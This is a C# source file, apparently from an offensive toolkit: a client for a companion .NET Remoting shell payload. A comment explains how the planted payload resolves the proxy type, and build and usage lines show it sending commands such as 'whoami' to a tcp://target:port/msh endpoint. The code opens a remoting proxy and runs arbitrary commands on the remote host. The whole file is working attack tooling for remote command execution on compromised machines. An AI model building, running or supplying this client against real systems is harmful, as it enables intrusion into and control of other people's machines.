// tools/RemotingShellClient.cs
// Standalone client for payloads/RemotingUriShell.cs.
//
// The remoting method-call message carries the CLIENT proxy's type full name
// ("<type>, <clientAssembly>") and the server resolves it before dispatch, so the stub
// must use the SAME type name as the server-side service class (nested E.Svc) - any
// assembly name works because the payload bridges failed resolutions to itself.
//
// Build: csc /out:RemotingShellClient.exe tools\RemotingShellClient.cs /r:System.Runtime.Remoting.dll
// Use  : RemotingShellClient.exe tcp://target:port/msh "whoami"

using System;

public class E
{
    public class Svc : MarshalByRefObject
    {
        public string Exec(string cmd) { throw new NotSupportedException("proxy only"); }
    }
}

public static class RemotingShellClient
{
    public static int Main(string[] args)
    {
        if (args.Length < 2)
        {
            Console.Error.WriteLine("usage: RemotingShellClient.exe <tcp://host:port/msh> <cmd>");
            return 1;
        }
        E.Svc svc = (E.Svc)Activator.GetObject(typeof(E.Svc), args[0]);
        Console.Write(svc.Exec(args[1]));
        return 0;
    }
}
